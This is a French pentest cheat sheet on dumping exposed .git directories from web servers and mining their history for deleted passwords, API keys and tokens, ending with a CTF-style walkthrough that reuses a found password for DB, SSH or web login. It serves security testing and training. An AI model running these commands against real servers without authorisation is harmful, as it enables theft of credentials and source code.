# GIT ENUMERATION

### <mark style="color:red;">🧩 Contexte</mark>

* Les répertoires `.git/` exposés sur un serveur web (souvent oubliés après un déploiement) permettent :
  * De récupérer **tout l’historique de code source**.
  * De découvrir des **mots de passe, clés API, tokens** supprimés mais présents dans l’historique.
  * De révéler des **failles de logique** ou des informations sensibles (ex: routes cachées, secrets de build).

***

### <mark style="color:red;">🔎 Commandes Git utiles en pentest</mark>

#### 1. Récupérer un dépôt `.git`

```bash
# Télécharger avec wget
wget -r -np -R "index.html*" http://target/.git/

# Outil spécialisé
git-dumper http://target/.git/ ./dumped_repo
```

***

#### 2. Réinitialiser l’arborescence pour naviguer

```bash
cd dumped_repo
git reset --hard
```

***

#### 3. Visualiser l’historique complet

```bash
git log --stat --all
```

* `--stat` → montre les fichiers modifiés/supprimés.
* `--all` → inclut toutes les branches et commits, même orphelins.

Exemple sortie :

```
commit 83d2f4b
Author: dev <dev@target>
Date:   Tue Jan 5 14:23:11 2025

 config.php | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
```

⚠️ Indice : un mot de passe supprimé peut apparaître ici.

***

#### 4. Explorer les commits en détail

```bash
git show <commit_id>
```

➡️ Montre les changements exacts, souvent secrets supprimés par erreur.

***

#### 5. Parcourir toutes les branches et tags

```bash
git branch -a
git tag -l
```

***

#### 6. Rechercher des secrets dans l’historique

```bash
git log -p | grep -i "password"
git log -p | grep -i "secret"
git log -p | grep -i "api"
```

***

#### 7. Récupérer un fichier à un commit précis

```bash
git checkout <commit_id> -- config.php
```

***

### <mark style="color:red;">🛠 Outils spécialisés pour Git enumeration</mark>

*   [**git-dumper**](https://github.com/arthaud/git-dumper)\
    → Télécharge automatiquement un dépôt `.git` exposé.

    ```bash
    python3 git_dumper.py http://target/.git/ ./target_repo
    ```
* [**git-tools**](https://github.com/internetwache/GitTools)
  * `gitdumper.sh` : dump complet.
  * `extractor.sh` : restaure l’arborescence et commits.
*   [**trufflehog**](https://github.com/trufflesecurity/trufflehog)\
    → Scan des secrets (regex + entropie) dans l’historique Git.

    ```bash
    trufflehog --regex --entropy=False ./target_repo
    ```
* [**gitleaks**](https://github.com/gitleaks/gitleaks)\
  → Alternative moderne à trufflehog pour secrets dans git.

***

### <mark style="color:red;">📂 Exemple d’exploitation en CTF</mark>

#### Étape 1 – Découverte

```bash
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt
```

→ Détection de `.git/`.

#### Étape 2 – Dump du repo

```bash
git-dumper http://target/.git/ ./repo
cd repo && git reset --hard
```

#### Étape 3 – Recherche d’indices

```bash
git log --stat --all
git show <commit_id>
grep -r "password" .
```

#### Étape 4 – Secret trouvé

Exemple :

```php
$db_pass = "Sup3rS3cr3tP@ss!";
```

➡️ Utilisation pour login DB / SSH / Web.

***
